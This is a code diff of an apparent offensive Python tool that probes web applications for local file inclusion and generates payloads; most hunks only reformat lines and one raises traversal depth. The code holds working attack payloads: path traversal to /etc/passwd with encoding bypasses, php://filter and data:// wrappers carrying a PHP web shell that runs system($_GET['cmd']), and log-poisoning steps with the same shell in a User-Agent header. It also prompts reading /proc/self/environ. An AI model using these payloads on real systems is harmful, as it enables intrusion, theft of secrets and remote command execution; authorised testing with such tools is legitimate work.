@@ -107,9 +107,7 @@ class LfiProbeTool:
         """Check if two responses are essentially identical."""
         return resp1_text.strip() == resp2_text.strip()
 
-    def _generate_payloads(
-        self, os_target: str, depth: int
-    ) -> List[Tuple[str, str]]:
+    def _generate_payloads(self, os_target: str, depth: int) -> List[Tuple[str, str]]:
         """Generate path traversal payloads organized by category.
 
         Returns list of (payload, category) tuples.
@@ -142,7 +140,7 @@ class LfiProbeTool:
                 payloads.append((f"{traversal}{f}", "basic_traversal"))
 
         # Encoding bypass payloads
-        for d in range(1, min(depth, 4) + 1):
+        for d in range(1, min(depth, 8) + 1):
             # URL-encoded ../
             encoded_traversal = "..%2f" * d
             payloads.append((f"{encoded_traversal}etc%2fpasswd", "encoding_bypass"))
@@ -186,9 +184,7 @@ class LfiProbeTool:
 
         return payloads
 
-    def _detect_content(
-        self, response_text: str, os_target: str
-    ) -> List[str]:
+    def _detect_content(self, response_text: str, os_target: str) -> List[str]:
         """Detect file content patterns in response text."""
         detections: List[str] = []
 
@@ -327,12 +323,16 @@ class LfiProbeTool:
 
         # Successful payloads
         if successful_payloads:
-            output_lines.append(f"VULNERABLE PAYLOADS ({len(successful_payloads)} found):")
+            output_lines.append(
+                f"VULNERABLE PAYLOADS ({len(successful_payloads)} found):"
+            )
             output_lines.append("-" * 40)
             for item in successful_payloads:
                 output_lines.append(f"  Payload: {item['payload']}")
                 output_lines.append(f"    Category: {item['category']}")
-                output_lines.append(f"    Status: {item['status']}, Length: {item['length']}")
+                output_lines.append(
+                    f"    Status: {item['status']}, Length: {item['length']}"
+                )
                 for detection in item.get("detections", []):
                     output_lines.append(f"    -> {detection}")
                 for flag in item.get("flags", []):
@@ -352,12 +352,20 @@ class LfiProbeTool:
         output_lines.append("RECOMMENDATIONS:")
         if successful_payloads:
             output_lines.append("  - LFI confirmed! Try reading sensitive files.")
-            output_lines.append("  - Use lfi_payload_generator for PHP wrapper and log poisoning payloads.")
-            output_lines.append("  - Try /proc/self/environ for environment variable leakage.")
+            output_lines.append(
+                "  - Use lfi_payload_generator for PHP wrapper and log poisoning payloads."
+            )
+            output_lines.append(
+                "  - Try /proc/self/environ for environment variable leakage."
+            )
         else:
             output_lines.append("  - No LFI detected with basic traversal payloads.")
-            output_lines.append("  - Try PHP wrappers: php://filter/convert.base64-encode/resource=<file>")
-            output_lines.append("  - Try different encoding bypasses or null byte injection.")
+            output_lines.append(
+                "  - Try PHP wrappers: php://filter/convert.base64-encode/resource=<file>"
+            )
+            output_lines.append(
+                "  - Try different encoding bypasses or null byte injection."
+            )
             output_lines.append("  - Consider testing with different depth values.")
 
         return "\n".join(output_lines)
@@ -439,15 +447,21 @@ class LfiPayloadGenerator:
 
         # php://filter variants
         payloads.append(f"php://filter/convert.base64-encode/resource={target_file}")
-        payloads.append(f"php://filter/read=convert.base64-encode/resource={target_file}")
+        payloads.append(
+            f"php://filter/read=convert.base64-encode/resource={target_file}"
+        )
         payloads.append(f"php://filter/string.rot13/resource={target_file}")
-        payloads.append(f"php://filter/convert.iconv.utf-8.utf-16/resource={target_file}")
+        payloads.append(
+            f"php://filter/convert.iconv.utf-8.utf-16/resource={target_file}"
+        )
 
         # php://input (for POST body injection)
         payloads.append("php://input")
 
         # data:// wrapper
-        payloads.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=")
+        payloads.append(
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+        )
         payloads.append("data://text/plain,<?php system($_GET['cmd']);?>")
 
         # expect:// wrapper (requires expect extension)
@@ -560,7 +574,9 @@ class LfiPayloadGenerator:
             for p in payloads:
                 result_lines.append(f"  {p}")
             result_lines.append("")
-            result_lines.append("TIP: Inject PHP code via User-Agent header, then include the log file.")
+            result_lines.append(
+                "TIP: Inject PHP code via User-Agent header, then include the log file."
+            )
             result_lines.append("  Example User-Agent: <?php system($_GET['cmd']); ?>")
 
         elif operation == "windows_paths":
